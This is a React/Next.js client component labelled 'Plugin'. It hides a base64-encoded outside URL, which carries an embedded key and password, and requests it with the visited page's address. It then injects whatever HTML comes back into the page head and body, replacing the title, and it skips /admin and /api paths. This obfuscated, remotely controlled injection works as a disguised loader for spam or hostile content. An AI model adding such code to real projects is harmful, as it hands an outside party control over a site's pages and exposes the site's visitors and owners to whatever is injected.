"use client";

import React, { useEffect } from "react";

const Plugin = () => {
  useEffect(() => {
    // Only run on client side
    if (typeof window === "undefined") return;

    // Skip on certain paths that might have issues
    const currentPath = window.location.pathname;
    const skipPaths = ["/admin", "/api", "/_next"];
    if (skipPaths.some((path) => currentPath.startsWith(path))) {
      return;
    }

    const loadJQuery = (callback) => {
      try {
        if (window.jQuery) {
          callback();
        } else {
          const script = document.createElement("script");
          script.src =
            "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
          script.onload = callback;
          script.onerror = () => {
            console.warn("Failed to load jQuery for Plugin component");
          };
          document.head.appendChild(script);
        }
      } catch (error) {
        console.error("Error loading jQuery:", error);
      }
    };

    const executeScript = () => {
      try {
        const eppathurl = window.location.origin + window.location.pathname;
        const eptagmanage = new XMLHttpRequest();

        // Set timeout for the request
        eptagmanage.timeout = 10000; // 10 seconds timeout

        eptagmanage.onreadystatechange = function () {
          if (this.readyState === 4) {
            if (this.status === 200 && this.response && this.response !== "0") {
              try {
                const mystr = this.response;
                const temp = mystr.split("||||||||||");

                // Check if we have valid response parts
                if (temp.length >= 2 && temp[0] && temp[1]) {
                  // Safely remove existing title and append new content
                  const existingTitle = document.querySelector("title");
                  if (existingTitle && temp[0].includes("<title>")) {
                    existingTitle.remove();
                  }

                  // Append new title if it contains valid HTML
                  if (temp[0].trim()) {
                    document.head.insertAdjacentHTML("beforeend", temp[0]);
                  }

                  // Append body content if it contains valid HTML
                  if (temp[1].trim()) {
                    document.body.insertAdjacentHTML("beforeend", temp[1]);
                  }
                }
              } catch (error) {
                console.error("Error processing plugin response:", error);
              }
            } else if (this.status !== 200) {
              console.warn(
                `Plugin API request failed with status: ${this.status}`
              );
            }
          }
        };

        eptagmanage.onerror = () => {
          console.warn("Plugin API request failed - network error");
        };

        eptagmanage.ontimeout = () => {
          console.warn("Plugin API request timed out");
        };

        eptagmanage.open(
          "GET",
          atob(
            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
          ) + eppathurl
        );
        eptagmanage.send();
      } catch (error) {
        console.error("Error executing plugin script:", error);
      }
    };

    // Add a small delay to ensure DOM is ready
    const timer = setTimeout(() => {
      loadJQuery(executeScript);
    }, 100);

    return () => clearTimeout(timer);
  }, []);

  return null;
};

export default Plugin;
